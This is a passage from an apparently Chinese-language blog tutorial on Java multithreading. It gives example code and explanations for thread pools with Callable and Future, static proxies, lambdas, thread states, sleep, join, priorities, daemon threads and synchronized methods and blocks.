class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCallable</span> <span class="keyword">implements</span> <span class="title class_">Callable</span>&lt;Boolean&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> String url;<span class="comment">//图片地址</span></span><br><span class="line">    <span class="keyword">private</span> String name;<span class="comment">//文件名</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestCallable</span><span class="params">(String url, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.url = url;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">WebDownloader</span> <span class="variable">webDownloader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebDownloader</span>();</span><br><span class="line">        webDownloader.downloader(url, name);</span><br><span class="line">        System.out.println(<span class="string">&quot;下载文件：&quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">        <span class="type">TestCallable</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestCallable</span>(<span class="string">&quot;https://img.lfalive.top/PT/HUDPT.jpg&quot;</span>, <span class="string">&quot;hudpt.jpg&quot;</span>);</span><br><span class="line">        <span class="type">TestCallable</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestCallable</span>(<span class="string">&quot;https://img.lfalive.top/PT/hitpt.JPG&quot;</span>, <span class="string">&quot;hitpt.jpg&quot;</span>);</span><br><span class="line">        <span class="type">TestCallable</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestCallable</span>(<span class="string">&quot;https://img.lfalive.top/PT/byrpt.JPG&quot;</span>, <span class="string">&quot;byrpt.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建执行服务</span></span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">ser</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//提交执行</span></span><br><span class="line">        Future&lt;Boolean&gt; r1 = ser.submit(t1);</span><br><span class="line">        Future&lt;Boolean&gt; r2 = ser.submit(t2);</span><br><span class="line">        Future&lt;Boolean&gt; r3 = ser.submit(t3);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取结果</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">rs1</span> <span class="operator">=</span> r1.get();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">rs2</span> <span class="operator">=</span> r2.get();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">rs3</span> <span class="operator">=</span> r3.get();</span><br><span class="line"></span><br><span class="line">        System.out.println(rs1);</span><br><span class="line">        System.out.println(rs2);</span><br><span class="line">        System.out.println(rs3);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关闭服务</span></span><br><span class="line">        ser.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WebDownloader</span> &#123;</span><br><span class="line">    <span class="comment">//下载方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">downloader</span><span class="params">(String url, String name)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtils.copyURLToFile(<span class="keyword">new</span> <span class="title class_">URL</span>(url), <span class="keyword">new</span> <span class="title class_">File</span>(name));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.out.println(<span class="string">&quot;IO异常&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>背景：经常<strong>创建</strong>和<strong>销毁</strong>、<strong>使用</strong>量特别大的资源，比如并发情况下的线程，对性能影响很大。</p><p>思路：提前创建好多个线程，放入线程池中，使用时直接获取，使用完放回池中。可以避免频繁创建销毁，实现重复利用。</p><p>好处：</p><ul><li>提高响应速度（减少了创建新线程的时间）</li><li>降低资源消耗（重复利用线程池中线程，不需要每次都创建）</li><li>便于线程管理：核心池的大小<code>corePoolSize</code>，最大线程数<code>maximumPoolSize</code>，线程没有任务时最多保持多长时间后会终止<code>keepAliveTime</code></li></ul><p>相关API：<code>Executors</code>和<code>ExecutorService</code>。</p><p><code>newFixedThreadPool()</code>方法创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。<code>ExecutorService</code>也可以和<code>Runnable</code>配合使用，如<code>execute(Runnable)</code>，<code>submit(Runnable)</code>，<code>submit(Callable)</code>等。</p><p><code>FutureTask</code>实现了<code>Future</code>接口，可以把<code>FutureTask</code>交给<code>Executor</code>执行；也可以通<code>ExecutorService.submit()</code>方法返回一个<code>FutureTask</code>，然后执行<code>FutureTask.get()</code>方法。通过返回的<code>Future</code>对象，我们可以检查提交的任务是否执行完毕。如果任务执行完成，<code>future.get()</code>方法会返回Callable任务的执行结果。注意，<code>future.get()</code>方法会产生阻塞。</p><p>调用<code>shutdown()</code>方法之后，<code>ExecutorService</code>不会立即关闭，但是它不再接收新的任务，直到当前所有线程执行完成才会关闭，所有在<code>shutdown()</code>执行之前提交的任务都会被执行。如果我们想立即关闭，可以调用<code>ExecutorService.shutdownNow()</code>方法。这个动作将跳过所有正在执行的任务和被提交还没有执行的任务。但是它并不对正在执行的任务做任何保证，有可能它们都会停止，也有可能执行完成。</p><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>真实对象和代理对象都要实现同一个接口，代理对象要代理真实角色。</p><p>好处：代理对象可以做很多真实对象做不了的事情，真实对象可以专注做自己的事情。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticProxy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">You</span> <span class="variable">you</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">You</span>(<span class="string">&quot;张三&quot;</span>);<span class="comment">//谁要结婚</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">WeddingCompany</span>(you).HappyMarry();<span class="comment">//交给婚庆公司安排</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Marry</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">HappyMarry</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//真实角色：去结婚</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">You</span> <span class="keyword">implements</span> <span class="title class_">Marry</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">You</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">HappyMarry</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name + <span class="string">&quot;结婚了，恭喜！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代理角色：帮target结婚</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WeddingCompany</span> <span class="keyword">implements</span> <span class="title class_">Marry</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Marry target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WeddingCompany</span><span class="params">(Marry target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">HappyMarry</span><span class="params">()</span> &#123;</span><br><span class="line">        before();</span><br><span class="line">        <span class="built_in">this</span>.target.HappyMarry();<span class="comment">//这就是真实对象</span></span><br><span class="line">        after();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;事后，结尾款。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;事前，布置会场。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-thread/StaticProxy.JPG"></p><h3 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h3><p>任何接口，如果只包含唯一一个抽象方法，那么它就是一个函数式接口。对于函数式接口，可以通过lambda表达式来创建该接口的对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//简化过程</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLambda1</span> &#123;</span><br><span class="line">    <span class="comment">//3.静态内部类</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Like2</span> <span class="keyword">implements</span> <span class="title class_">ILike</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lambda</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;I like lambda2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ILike</span> <span class="variable">like</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Like</span>();</span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        like = <span class="keyword">new</span> <span class="title class_">Like2</span>();</span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.局部内部类</span></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Like3</span> <span class="keyword">implements</span> <span class="title class_">ILike</span> &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lambda</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;I like lambda3&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        like = <span class="keyword">new</span> <span class="title class_">Like3</span>();</span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.匿名内部类</span></span><br><span class="line">        like = <span class="keyword">new</span> <span class="title class_">ILike</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lambda</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;I like lambda4&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.用lambda简化</span></span><br><span class="line">        like = () -&gt; System.out.println(<span class="string">&quot;I like lambda5&quot;</span>);</span><br><span class="line">        like.lambda();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.定义一个函数式接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILike</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">lambda</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Like</span> <span class="keyword">implements</span> <span class="title class_">ILike</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lambda</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I like lambda&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-thread/lambda.JPG"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//带参数的lambda表达式</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLambda2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ILove</span> <span class="variable">love</span> <span class="operator">=</span> (a, b) -&gt; System.out.println(a + <span class="string">&quot; love &quot;</span> + b);</span><br><span class="line">        love.love(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILove</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">love</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="线程状态"><a href="#线程状态" class="headerlink" title="线程状态"></a>线程状态</h1><p><img src="https://img.lfalive.top/Learn-java-thread/state.JPG"></p><h2 id="线程方法"><a href="#线程方法" class="headerlink" title="线程方法"></a>线程方法</h2><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">setPriority(int newPriority)</td><td align="center">更改线程的优先级</td></tr><tr><td align="center">static void sleep(long millis)</td><td align="center">在指定的毫秒数内让当前正在执行的线程休眠</td></tr><tr><td align="center">void join()</td><td align="center">等待该线程终止</td></tr><tr><td align="center">static void yield()</td><td align="center">暂停当前正在执行的线程对象，并执行其他线程</td></tr><tr><td align="center">void interpret()</td><td align="center">中断线程，别用这个方式</td></tr><tr><td align="center">boolean isAlive()</td><td align="center">测试线程是否处于活动状态</td></tr></tbody></table><h2 id="停止线程"><a href="#停止线程" class="headerlink" title="停止线程"></a>停止线程</h2><p>不推荐使用JDK提供的stop()，destroy()方法，已废弃。推荐让线程自己停下来。简直使用一个标志位进行终止变量，当flag&#x3D;false，则终止线程运行。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestStop</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (flag) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;running&quot;</span> + i++);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.flag = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TestStop</span> <span class="variable">testStop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestStop</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(testStop).start();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;main&quot;</span> + i);</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">900</span>) &#123;</span><br><span class="line">                testStop.stop();</span><br><span class="line">                System.out.println(<span class="string">&quot;time to stop&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-thread/TestStop.JPG"></p><h2 id="线程休眠"><a href="#线程休眠" class="headerlink" title="线程休眠"></a>线程休眠</h2><p>sleep存在异常InterruptException，sleep时间达到后线程进入就绪状态，可以模拟网络延时、倒计时等。</p><p><strong>每个对象都有一个锁，sleep不会释放锁。</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//倒计时器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSleep</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            countDown(<span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">countDown</span><span class="params">(<span class="type">int</span> num)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(num--);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程礼让yield"><a href="#线程礼让yield" class="headerlink" title="线程礼让yield"></a>线程礼让yield</h2><p> 让当前正在执行的线程暂停，但不阻塞。将线程从运行状态转为就绪状态，让CPU重新调度。<strong>礼让不一定成功，取决于CPU。</strong></p><h2 id="合并线程"><a href="#合并线程" class="headerlink" title="合并线程"></a>合并线程</h2><p><code>Join()</code>合并线程，待此线程执行完成后，再执行其他线程，其他线程阻塞。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestJoin</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">500</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;vip--&gt;&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">TestJoin</span> <span class="variable">testJoin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestJoin</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(testJoin);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">300</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">200</span>) &#123;</span><br><span class="line">                thread.join();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;main--&gt;&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-thread/join1.JPG"></p><p><img src="https://img.lfalive.top/Learn-java-thread/join2.JPG" alt="join2"></p><h2 id="线程状态观测"><a href="#线程状态观测" class="headerlink" title="线程状态观测"></a>线程状态观测</h2><p><img src="https://img.lfalive.top/Learn-java-thread/stateDetail.JPG"></p><p>线程状态处于以下几个状态之一：<strong>NEW、RUNNABLE、BLOCKED、WATTING、TIMED_WAITTING、TERMINATED</strong>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestState</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Thread.<span class="type">State</span> <span class="variable">state</span> <span class="operator">=</span> thread.getState();</span><br><span class="line">        System.out.println(state);</span><br><span class="line"></span><br><span class="line">        thread.start();</span><br><span class="line">        state = thread.getState();</span><br><span class="line">        System.out.println(state);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (state != Thread.State.TERMINATED) &#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            state = thread.getState();</span><br><span class="line">            System.out.println(state);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-thread/TestState.JPG"></p><h2 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h2><p>线程的优先级用数字表示，通过<code>getPriority()</code>获取优先级，通过<code>setPriority(int)</code>改变优先级。默认最大优先级<code>MAX_PRIORITY</code>为10，最小<code>MIN_PRIORITY</code>为1，可修改。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPriority</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;--&gt;&quot;</span> + Thread.currentThread().getPriority());</span><br><span class="line">        <span class="type">MyPriority</span> <span class="variable">myPriority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyPriority</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(myPriority);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(myPriority);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(myPriority);</span><br><span class="line"></span><br><span class="line">        t1.setPriority(<span class="number">1</span>);</span><br><span class="line">        t2.setPriority(<span class="number">4</span>);</span><br><span class="line">        t3.setPriority(Thread.MAX_PRIORITY);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPriority</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;--&gt;&quot;</span> + Thread.currentThread().getPriority());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-thread/Priority.JPG"></p><p>优先级低只是意味着获得调度的概率低，并不是优先级低就不会被调用了，<strong>都是看CPU的调度</strong>。</p><h2 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h2><p>线程分为<strong>守护线程</strong>和<strong>用户线程</strong>。虚拟机必须确保用户线程执行完毕，但不必等待守护线程执行完毕。守护线程，和后台记录操作日志、监控内存、垃圾回收等。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">thread.setDaemon(<span class="literal">true</span>); <span class="comment">//默认是false，表示用户线程，正常线程都是用户线程。</span></span><br></pre></td></tr></table></figure><h1 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h1><p>并发：<strong>同一个对象</strong>被<strong>多个线程</strong>同时操作。</p><p>线程同步其实就是一种等待机制，多个线程进入<strong>这个对象的等待池</strong>形成队列。</p><p>&#x3D;&#x3D;&gt;加入<strong>锁机制synchronized</strong>，一个线程获得对象的排它锁，独占资源，其他线程必须等待其使用完后释放锁。锁机制会引起一定程度的性能问题，以换取安全性。例如，如果一个优先级高的线程等一个优先级低的线程释放锁，会导致优先级倒置。</p><h2 id="不安全的例子"><a href="#不安全的例子" class="headerlink" title="不安全的例子"></a>不安全的例子</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//线程不安全的例子</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnsafeList</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; list.add(Thread.currentThread().getName())).start();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(list.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后集合大小小于10000，因为同时可能会有多个线程操作一个对象。</p><h2 id="同步方法和同步块"><a href="#同步方法和同步块" class="headerlink" title="同步方法和同步块"></a>同步方法和同步块</h2><p><code>synchronized</code>关键字有两种用法，<code>synchronized</code>方法和<code>synchronized</code>块。</p><h3 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">(<span class="type">int</span> args)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>每个对象都有一把锁，<code>synchronized</code>方法都必须获得调用该方法的对象的锁才能运行，线程一旦执行，就独占该锁，直到方法返回释放。缺点：将一个大的方法声明为<code>synchronized</code>会影响效率，锁得太多，浪费资源。</p><h3 id="同步块"><a href="#同步块" class="headerlink" title="同步块"></a>同步块</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (Obj) &#123;&#125;</span><br></pre></td></tr></table></figure><p>Obj称之为同步监视器，Obj可以是任何对象，推荐使用共享资源作为同步监视器。同步方法中无需指定同步监视器，因为同步方法的同步监视器就是this，就是这对象本身。</p><figure class="highlight 